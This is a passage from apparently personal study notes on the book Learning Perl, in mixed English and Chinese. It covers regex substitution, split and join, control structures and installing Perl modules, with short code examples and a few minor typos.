class="hljs-string">&quot;No match: |$_|\n&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise"></a>Exercise</h2><h1 id="CHAPTER-9-Processing-Text-with-Regular-Expressions"><a href="#CHAPTER-9-Processing-Text-with-Regular-Expressions" class="headerlink" title="CHAPTER 9 Processing Text with Regular Expressions"></a>CHAPTER 9 Processing Text with Regular Expressions</h1><h2 id="Substitutions-with-s-x2F-x2F-x2F"><a href="#Substitutions-with-s-x2F-x2F-x2F" class="headerlink" title="Substitutions with s&#x2F;&#x2F;&#x2F;"></a>Substitutions with s&#x2F;&#x2F;&#x2F;</h2><p>This simply replaces whatever part of a variable matches the pattern with a replacement string.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = <span class="hljs-string">&quot;He&#x27;s out bowing with Barney tonight.&quot;</span>;<br><span class="hljs-regexp">s/Barney/Fred/</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$_\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Using Boolean value to judge:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = <span class="hljs-string">&quot;fred flinnstone&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">s/fred/wilma/</span>) &#123;<br>   <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Successfully rep;aced fred with wilma.&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Globale-Replacements-with-x2F-g"><a href="#Globale-Replacements-with-x2F-g" class="headerlink" title="Globale Replacements with &#x2F;g"></a>Globale Replacements with &#x2F;g</h3><p>like:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">s</span>/\<span class="hljs-selector-tag">A</span>\<span class="hljs-selector-tag">s</span>+|\<span class="hljs-selector-tag">s</span>+\<span class="hljs-selector-tag">z</span><span class="hljs-comment">//g</span><br></code></pre></td></tr></table></figure><h3 id="Different-Delimiters"><a href="#Different-Delimiters" class="headerlink" title="Different Delimiters"></a>Different Delimiters</h3><p>Using <code>#</code> like:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">s<span class="hljs-meta">#\Ahttps:<span class="hljs-comment">//#http://#</span></span><br></code></pre></td></tr></table></figure><p>使用成对的delimiters需分别括住:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">s</span><span class="hljs-template-variable">&#123;fred&#125;</span><span class="hljs-template-variable">&#123;barney&#125;</span><span class="language-xml">;</span><br></code></pre></td></tr></table></figure><h3 id="Nondestructive-Substitutions"><a href="#Nondestructive-Substitutions" class="headerlink" title="Nondestructive Substitutions"></a>Nondestructive Substitutions</h3><p>复制一份:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $original = <span class="hljs-string">&#x27;Fred ate 1 rid&#x27;</span>;<br><span class="hljs-keyword">my</span> $copy = $original;<br>$copy =~ <span class="hljs-regexp">s/\d+ ribs?/10 ribs/</span>;<br></code></pre></td></tr></table></figure><p>Adding in Perl 5.14, 使用<code>\r</code>modifier可保留original strng alone and return a modified copy of it:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">14</span>;<br><br><span class="hljs-keyword">my</span> $copy = $original =~ <span class="hljs-regexp">s/\d+ ribs?/10 ribs/r</span>;<br></code></pre></td></tr></table></figure><p><code>=~</code> is higher precedence than the <code>=</code>.</p><h3 id="Case-Shifting"><a href="#Case-Shifting" class="headerlink" title="Case Shifting"></a>Case Shifting</h3><p>Using <code>\U</code> forces what follows to all uppercase:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;I saw Barney with Fred,&quot;</span>;<br>s<span class="hljs-regexp">/(fred|barney)/</span>\U<span class="hljs-variable">$1</span>/gi;<br></code></pre></td></tr></table></figure><p>The <code>\L</code> escape forces lowercase.</p><p>Turning off case shifting with <code>\E</code>.</p><p>When written in lowercase (<code>\l</code> and <code>\u</code>), they affect only the next character,</p><p>Using <code>\u</code> with <code>\L</code> means “all lowercase, but capitalize the first letter.”.</p><p>These escape sequences are avaliable in any double-quotish string:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Hello, \L\u<span class="hljs-variable">$name</span>\E, would you like to play a game?\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Functions <code>lc</code>, <code>uc</code>, <code>fc</code>, <code>lcfirst</code>, and <code>ucfirst</code>. like:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $start = <span class="hljs-string">&quot;Fred&quot;</span>;<br><span class="hljs-keyword">my</span> $uncapp = <span class="hljs-keyword">lc</span>( $start );<br></code></pre></td></tr></table></figure><h3 id="Metaquoting"><a href="#Metaquoting" class="headerlink" title="Metaquoting"></a>Metaquoting</h3><p>太多的backslashes会很乱。Using <code>\Q</code>和<code>\E</code>.</p><p><code>\Q</code> quote everything after it. 也可以用<code>quotemeta</code>function:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $profix = <span class="hljs-keyword">quotemeta</span>( $input_pattern );<br><span class="hljs-keyword">if</span> ( <span class="hljs-regexp">s/$prefix(Fred)/$1/</span> ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Replaced $1\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-split-Operator"><a href="#The-split-Operator" class="headerlink" title="The split Operator"></a>The split Operator</h2><p>It looks like this:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @field = <span class="hljs-keyword">split</span> <span class="hljs-regexp">/separator/</span>, $string;<br></code></pre></td></tr></table></figure><p>就是根据指定的分隔符来分割。返回一个list.</p><p>一个rule, leading empty fields are always returned, but trailing empty fields are discarded.</p><p>if you want the trailing empty field, give splite a third argument of -1.</p><p>The dafault for splite is to break up <code>$_</code> on whitespace:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @fields = <span class="hljs-keyword">split</span>;<br></code></pre></td></tr></table></figure><h2 id="The-join-Function"><a href="#The-join-Function" class="headerlink" title="The join Function"></a>The join Function</h2><p>The join function looks like this:</p><p><code>join</code> 的第一个参数是string.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $result = <span class="hljs-keyword">join</span> $glue, @pieces;<br></code></pre></td></tr></table></figure><p>用<code>$glue</code>中的内容来连接<code>@pieces</code>中的元素. 返回resulting string.</p><p>Using <code>split</code> and <code>join</code> to work together.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @values = <span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>, $x;<br><span class="hljs-keyword">my</span> $z = <span class="hljs-keyword">join</span> <span class="hljs-string">&quot;-&quot;</span>, @values;<br></code></pre></td></tr></table></figure><h2 id="m-x2F-x2F-in-List-Context"><a href="#m-x2F-x2F-in-List-Context" class="headerlink" title="m&#x2F;&#x2F; in List Context"></a>m&#x2F;&#x2F; in List Context</h2><p>When a pattern match <code>m//</code> is used in a list context, the return value is a list of the capture variables created in the match, or an empty list if the match failed.</p><p><code>m//</code> 是默认的, 也就是普通的 <code>//</code>.</p><p>返回捕获组。也可用于分离:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $text = <span class="hljs-string">&quot;Fred dropped a 5 ton granite block on Mr.Slate&quot;</span>;<br><span class="hljs-keyword">my</span> @words = ($text =~ <span class="hljs-regexp">/([a-z]+)/ig</span>);<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Result: @words\n&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="More-Powerful-Regular-Expressions"><a href="#More-Powerful-Regular-Expressions" class="headerlink" title="More Powerful Regular Expressions"></a>More Powerful Regular Expressions</h2><h3 id="Nongreedy-Quantifier"><a href="#Nongreedy-Quantifier" class="headerlink" title="Nongreedy Quantifier"></a>Nongreedy Quantifier</h3><p>Adding <code>?</code> after the quantifier</p><p>匹配as few as possible, like:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">my</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&lt;b&gt;Fred&lt;/b&gt; and &lt;b&gt;Barney&lt;/b&gt;&#x27;</span>;<br><span class="hljs-attribute">my</span> <span class="hljs-variable">$match_count</span> = <span class="hljs-variable">$text</span> =<span class="hljs-regexp">~ s|&lt;b&gt;(.*?)&lt;/b&gt;|\U<span class="hljs-variable">$1</span>|g</span>;<br><span class="hljs-attribute">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$match_count</span>: <span class="hljs-variable">$text</span>\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>会匹配到两个而不是一个.</p><h3 id="Fancier-Word-Boundaries"><a href="#Fancier-Word-Boundaries" class="headerlink" title="Fancier Word Boundaries"></a>Fancier Word Boundaries</h3><p>Adding in Perl 5.22, adding curly braces to denote:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">22</span>;<br><br><span class="hljs-keyword">my</span> $string = <span class="hljs-string">&quot;this doesn&#x27;t capitalize correctly.&quot;</span>;<br>$string =~ <span class="hljs-regexp">s/\b&#123;wb&#125;(\w)/\U$1/g</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$string\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>\b&#123;wb&#125;</code> 用于单词.<br><code>\b&#123;sb&#125;</code> 用于句号.<br><code>\b&#123;lb&#125;</code> knows where to insert the newlines.</p><h3 id="Matching-Multiple-Line-Text"><a href="#Matching-Multiple-Line-Text" class="headerlink" title="Matching Multiple-Line Text"></a>Matching Multiple-Line Text</h3><p>Using <code>^</code> and <code>$</code> for whole string.</p><p>Adding <code>\m</code> for one line.</p><h3 id="Updating-Many-Files"><a href="#Updating-Many-Files" class="headerlink" title="Updating Many Files"></a>Updating Many Files</h3><p>Perl’s own <code>localtime</code> function.</p><p>The special variable <code>$^I</code>. By default it’s undef, when there’s a string in <code>$^I</code>, that string is used as a backup filename’s extension. 即该字符串就会变成备份文件的扩展名，新的内容会output到以原来的文件名为名的文件中.</p><p>只要设置了这个变量就会起作用. 会将原来的文件加上这个扩展名.</p><p>Perl没有实际修改一个文件, 它创建了一个新文件并传入更新的内容.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl -w</span><br><br><span class="hljs-keyword">use</span> strict;<br><br><span class="hljs-keyword">chomp</span>(<span class="hljs-keyword">my</span> $date = <span class="hljs-string">`date`</span>);<br>$^I = <span class="hljs-string">&quot;.bak&quot;</span>;<br><br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>  <span class="hljs-regexp">s/\AAuthor:.*/Author: Randal L. Schwartz/</span>;<br>  <span class="hljs-regexp">s/\APhone:.*\n//</span>;<br>  <span class="hljs-regexp">s/\ADate:.*/Date: $date/</span>;<br>  <span class="hljs-keyword">print</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="In-Place-Editing-from-the"><a href="#In-Place-Editing-from-the" class="headerlink" title="In-Place Editing from the"></a>In-Place Editing from the</h3><p>命令行参数:</p><p>Some options:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-p    Telling Perl <span class="hljs-keyword">to</span> write a program <span class="hljs-keyword">for</span> you like:<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>   <span class="hljs-built_in">print</span> ;<br>&#125;<br><br>-n    Leaving out the automatic <span class="hljs-built_in">print</span> statement.<br><br>-i.bak    <span class="hljs-keyword">To</span> <span class="hljs-built_in">get</span> a backupfile, <span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t, using -i alone.</span><br><span class="hljs-string"></span><br><span class="hljs-string">-w    Turning on the warnings.</span><br><span class="hljs-string"></span><br><span class="hljs-string">-e    says &quot;executable code follows&quot; 代码会添加到print之前.</span><br></code></pre></td></tr></table></figure><p>for example:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ perl -<span class="hljs-selector-tag">p</span> -<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.bak</span> -w -e <span class="hljs-string">&#x27;s/Randall/Randal/g&#x27;</span> fred*.dat<br></code></pre></td></tr></table></figure><h2 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise"></a>Exercise</h2><p>打开文件，需要判断是否成功打开。</p><h1 id="CHAPTER-10-More-Control-Structures"><a href="#CHAPTER-10-More-Control-Structures" class="headerlink" title="CHAPTER 10 More Control Structures"></a>CHAPTER 10 More Control Structures</h1><h2 id="The-unless-Control-Structure"><a href="#The-unless-Control-Structure" class="headerlink" title="The unless Control Structure"></a>The unless Control Structure</h2><p>Executing a block of code only whe n the conditional is false:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unless</span> ($fred =~ <span class="hljs-regexp">/\A[A-Z_]\w*\z/i</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value of ...&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-else-Clause-with-unless"><a href="#The-else-Clause-with-unless" class="headerlink" title="The else Clause with unless"></a>The else Clause with unless</h3><p>The syntax is:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">unless () &#123;<br>  <span class="hljs-params">...</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-until-Control-Structure"><a href="#The-until-Control-Structure" class="headerlink" title="The until Control Structure"></a>The until Control Structure</h2><p>Revers  the condition of a while loop.</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">until</span> ($j &gt; $i) &#123;<br>  $j *= <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Statement-Modifiers"><a href="#Statement-Modifiers" class="headerlink" title="Statement Modifiers"></a>Statement Modifiers</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span> is a negative number.\n&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-variable">$n</span> &lt; 0; <br></code></pre></td></tr></table></figure><p>Perl 还是会evaluated first.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;error(<span class="hljs-string">&quot;Invalid input&quot;</span>) <span class="hljs-keyword">unless</span> &amp;valid($input);<br>$i *= <span class="hljs-number">2</span> <span class="hljs-keyword">until</span> $i &gt; $j;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot; &quot;</span>, ($n += <span class="hljs-number">2</span>) <span class="hljs-keyword">while</span> $n &lt; <span class="hljs-number">10</span>;<br>&amp;greet($_) <span class="hljs-keyword">foreach</span> @person;<br></code></pre></td></tr></table></figure><h2 id="The-Naked-Block-Control-Structure"><a href="#The-Naked-Block-Control-Structure" class="headerlink" title="The Naked Block Control Structure"></a>The Naked Block Control Structure</h2><p>The so-called “naked” block  is one without a keyword or condition.</p><p>like:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Please enter a number: &quot;</span>;<br>  <span class="hljs-keyword">chomp</span>(<span class="hljs-keyword">my</span> $n = &lt;STDIN&gt;);<br>  <span class="hljs-keyword">my</span> $root = <span class="hljs-keyword">sqrt</span> $n;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The square root of $n is $root.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不是loop，只运行一次.</p><h2 id="The-elsif-Clause"><a href="#The-elsif-Clause" class="headerlink" title="The elsif Clause"></a>The elsif Clause</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ( ! <span class="hljs-keyword">defined</span> $dino ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value is undef.\n&quot;</span>;<br>&#125; <span class="hljs-keyword">elsif</span> ($dino =~ <span class="hljs-regexp">/^-?\d+\.?$/</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The value is an integer.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Autoincrement-and-Autodecrement"><a href="#Autoincrement-and-Autodecrement" class="headerlink" title="Autoincrement and Autodecrement"></a>Autoincrement and Autodecrement</h2><p>The autoincrement operator <code>++</code>.</p><p>The autodecrement operator <code>--</code>.</p><h2 id="The-for-Control-Structure"><a href="#The-for-Control-Structure" class="headerlink" title="The for Control Structure"></a>The for Control Structure</h2><p>like C:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for (initialization<span class="hljs-comment">; test; increment) &#123;</span><br>body<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Secret-Connection-Between-foreach-and-for"><a href="#The-Secret-Connection-Between-foreach-and-for" class="headerlink" title="The Secret Connection Between foreach and for"></a>The Secret Connection Between foreach and for</h2><p>Inside the Perl parser, the keyword foreach is exactly equivalent tp the keyword for.</p><p>If it find semicolons, it’s the C-style for.</p><h2 id="The-last-Operator"><a href="#The-last-Operator" class="headerlink" title="The last Operator"></a>The last Operator</h2><p>Like <code>break</code> operator in C.</p><p>The last operator immediately ends execution of the loop.</p><h2 id="The-next-Operator"><a href="#The-next-Operator" class="headerlink" title="The next Operator"></a>The next Operator</h2><p>Like <code>continue</code> operator in C.</p><p>开始下一轮循环.</p><h2 id="The-redo-Operator"><a href="#The-redo-Operator" class="headerlink" title="The redo Operator"></a>The redo Operator</h2><p>重新开始循环.</p><h2 id="Labeled-Block"><a href="#Labeled-Block" class="headerlink" title="Labeled Block"></a>Labeled Block</h2><p>Lables in Perl are like other identifiers.</p><p>Recommending to make them to be all uppercase.</p><p>To lable a loop block, just put the label and a colon in front of the loop:</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LINE</span>: <span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>  <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">split</span>) &#123;<br>    last <span class="hljs-keyword">LINE</span> <span class="hljs-keyword">if</span> /__END__/<span class="hljs-comment">;</span><br>    ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>You may use lable after <code>lasr</code>, <code>next</code>, or <code>redo</code>.</p><h2 id="The-Conditional-Operator"><a href="#The-Conditional-Operator" class="headerlink" title="The Conditional Operator"></a>The Conditional Operator</h2><p>C语言有的东西，Perl基本上也有.</p><p>The conditional operator: <code>?:</code>.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">expression ? <span class="hljs-keyword">if</span>_<span class="hljs-literal">true</span>_expr : <span class="hljs-keyword">if</span>_<span class="hljs-literal">false</span>_expr<br></code></pre></td></tr></table></figure><h2 id="Logical-Operators"><a href="#Logical-Operators" class="headerlink" title="Logical Operators"></a>Logical Operators</h2><p>Logical AND operator <code>&amp;&amp;</code> and logical OR operator <code>||</code>.</p><h2 id="The-Value-of-a-Short-Circuit-Operator"><a href="#The-Value-of-a-Short-Circuit-Operator" class="headerlink" title="The Value of a Short-Circuit Operator"></a>The Value of a Short-Circuit Operator</h2><p>Using logical OR operator to selecting a default value:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_name = $last_name&#123;$someone&#125; || <span class="hljs-string">&#x27;(No last name)&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="The-defined-or-Operator"><a href="#The-defined-or-Operator" class="headerlink" title="The defined-or Operator"></a>The defined-or Operator</h2><p>The defined-or operator <code>//</code>. Adding in perl 5.10:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use v5.<span class="hljs-number">10</span>;<br><br>my <span class="hljs-variable">$last_name</span> = <span class="hljs-variable">$last_name</span>&#123;<span class="hljs-variable">$someone</span>&#125; <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;(No last name)&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Set a value when there isn’t one already:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><span class="hljs-keyword">use</span> warning;<br><br><span class="hljs-keyword">my</span> $name;<br><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;%s&quot;</span>, $name // <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="Control-Structure-Using-Partial-Evaluation-Operators"><a href="#Control-Structure-Using-Partial-Evaluation-Operators" class="headerlink" title="Control Structure Using Partial-Evaluation Operators"></a>Control Structure Using Partial-Evaluation Operators</h2><p><code>&amp;&amp;</code>, <code>||</code>, <code>//</code>, and <code>?:</code> are share a peculiar property: depending upon the value on the left side, they may or may not evaluate an expression. They are sometimes called partial-evaluation operator.</p><h2 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise"></a>Exercise</h2><p>使用<code>say</code>函数要添加<code>use v5.10</code>.</p><h1 id="CHAPTER-11-Perl-Modules"><a href="#CHAPTER-11-Perl-Modules" class="headerlink" title="CHAPTER 11 Perl Modules"></a>CHAPTER 11 Perl Modules</h1><h2 id="Finding-Modules"><a href="#Finding-Modules" class="headerlink" title="Finding Modules"></a>Finding Modules</h2><p>Modules come in two types:</p><pre><code class="hljs">  1. Come with Perl  2. Get from CAPN  3. Vendor modules</code></pre><h3 id="Check-if-it-is-already-installed"><a href="#Check-if-it-is-already-installed" class="headerlink" title="Check if it is already installed"></a>Check if it is already installed</h3><p>One way, read with <code>perldoc</code>:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>perldoc <span class="hljs-title class_">Digest</span>::<span class="hljs-title class_">SHA</span><br></code></pre></td></tr></table></figure><h3 id="Give-details-on-a-module"><a href="#Give-details-on-a-module" class="headerlink" title="Give details on a module"></a>Give details on a module</h3><p>Using <code>capn</code> command:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpan -D <span class="hljs-title class_">Digest</span>::<span class="hljs-title class_">SHA</span><br></code></pre></td></tr></table></figure><h2 id="Install-Modules"><a href="#Install-Modules" class="headerlink" title="Install Modules"></a>Install Modules</h2><p>If you use <code>ExtUtils::MakeMaker</code>.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl Makefile.PL<br><span class="hljs-variable">$ </span>make install<br></code></pre></td></tr></table></figure><p>Special another directory with an <code>INSTALL_BASE</code> argument to Makefile.PL:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ perl Makefile.PL INSTALL_BASE=<span class="hljs-regexp">/Users/</span>fred/lib<br></code></pre></td></tr></table></figure><p>Using another module <code>Module::Build</code></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl Build.PL<br><span class="hljs-variable">$ </span>./Build install<br></code></pre></td></tr></table></figure><p>Specify an alternate installation directory:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ perl Build.PL --install_base=<span class="hljs-regexp">/Users/</span>fred/lib<br></code></pre></td></tr></table></figure><p>The <code>.pm</code> file extension stands for “Perl Module”.</p><p>启用perl自己的shell来满足依赖:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">perl</span> -MCPAN -<span class="hljs-keyword">e</span> <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>使用<code>cpan</code>来下载, 后面跟模块:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpan <span class="hljs-title class_">Module</span>::<span class="hljs-title class_">CoreList</span> <span class="hljs-title class_">LWP</span> <span class="hljs-title class_">CGI</span>::<span class="hljs-title class_">Prototype</span><br></code></pre></td></tr></table></figure><p>使用 Perl Package Manager (PPM) 来下载:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ppm time::<span class="hljs-title class_">Moment</span><br></code></pre></td></tr></table></figure><p>使用<code>cpanm</code>(for cpanminus):</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cpanm <span class="hljs-title class_">DBI</span> <span class="hljs-title class_">WWW</span>::<span class="hljs-title class_">Mechanize</span><br></code></pre></td></tr></table></figure><h2 id="Using-Your-Own-Directories"><a href="#Using-Your-Own-Directories" class="headerlink" title="Using Your Own Directories"></a>Using Your Own Directories</h2><p>Using <code>local::lib</code>.</p><p>To see what they set by loading the module on the command 